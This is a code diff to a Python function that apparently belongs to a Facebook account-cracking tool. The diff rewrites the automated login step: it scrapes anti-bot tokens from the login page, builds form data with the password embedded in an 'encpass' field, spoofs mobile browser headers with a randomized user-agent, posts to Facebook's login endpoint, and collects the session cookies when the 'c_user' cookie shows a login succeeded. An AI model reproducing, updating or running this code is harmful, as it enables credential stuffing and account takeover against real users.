@@ -896,44 +896,42 @@ def m1(idf,pwv):
    session = requests.Session()
    lok = ('prod','alpha','beta')
    pro = random.choice(lok)
-   free_fb = session.get(f'https://m.facebook.com').text
+   free_fb = session.get(f'https://free.facebook.com').text
    log_data = {
-    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-   "try_number":"0",
-   "unrecognized_tries":"0",
-   "email":idf,
-   "pass":ps,
-   "login":"Log In"}
+    'jazoest':re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+    'lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+    'trynum': '1',
+    'timezone': '-360',
+    'lgndim': 'eyJ3IjozOTMsImgiOjg5NSwiYXciOjM5MywiYWgiOjg5NSwiYyI6MjR9',
+    'lgnrnd': '080353_cIDH',
+    'lgnjs': '1708099434',
+    'email': idf,
+    'prefill_contact_point': idf,
+    'prefill_source': 'browser_dropdown',
+    'prefill_type': 'contact_point',
+    'first_prefill_source': 'browser_dropdown',
+    'first_prefill_type': 'contact_point',
+    'had_cp_prefilled': 'true',
+    'had_password_prefilled': 'false',
+    'encpass': "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),ps),}
    header_freefb = {
-   'Host': 'm.facebook.com',
-   'content-length': '1662',
-   'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
-   'sec-ch-ua-mobile': '?1',
-   'user-agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(80,126))+".0.0.0 Mobile Safari/537.36",
-   'x-response-format': 'JSONStream',
-   'content-type': 'application/x-www-form-urlencoded',
-   'x-fb-lsd': 'AVrEIFcZUZg',
-   'viewport-width': '360',
-   'sec-ch-ua-platform-version': "",
-   'x-requested-with': 'XMLHttpRequest',
-   'x-asbd-id': '129477',
-   'dpr': '2',
-   'sec-ch-ua-full-version-list': '',
-   'sec-ch-ua-model': "",
-   'sec-ch-prefers-color-scheme': 'light',
-   'sec-ch-ua-platform': '"Android"',
-   'accept': '*/*',
-   'origin': 'https://m.facebook.com',
-   'sec-fetch-site': 'same-origin',
-   'sec-fetch-mode': 'cors',
-   'sec-fetch-dest': 'empty',
-   'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522kky3vl1osp9t41ih71j31ai5qhl2578v0sodfs53bqjftxcocp0%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Fexplore%25252Fpeople%25252F%25253F__coig_login%25253D1%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D171573e4-57cf-48ae-b5ef-446e37bda5bd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522kky3vl1osp9t41ih71j31ai5qhl2578v0sodfs53bqjftxcocp0%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Fexplore%25252Fpeople%25252F%25253F__coig_login%25253D1%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0',
-   'accept-encoding': 'gzip, deflate, br',
-   'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-   lo = session.post(f'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522kky3vl1osp9t41ih71j31ai5qhl2578v0sodfs53bqjftxcocp0%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Fexplore%25252Fpeople%25252F%25253F__coig_login%25253D1%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D171573e4-57cf-48ae-b5ef-446e37bda5bd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522kky3vl1osp9t41ih71j31ai5qhl2578v0sodfs53bqjftxcocp0%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Fexplore%25252Fpeople%25252F%25253F__coig_login%25253D1%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0',data=log_data,headers=header_freefb).text
+    'authority': 'm.facebook.com',
+    'method': 'GET',
+    'path': '/?tbua=1',
+    'scheme': 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+    'referer': 'https://m.facebook.com/',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; U; Android 9; en-us; GT-J768I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4471.60 Mobile Safari/537.36'}
+   lo = session.post(f'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
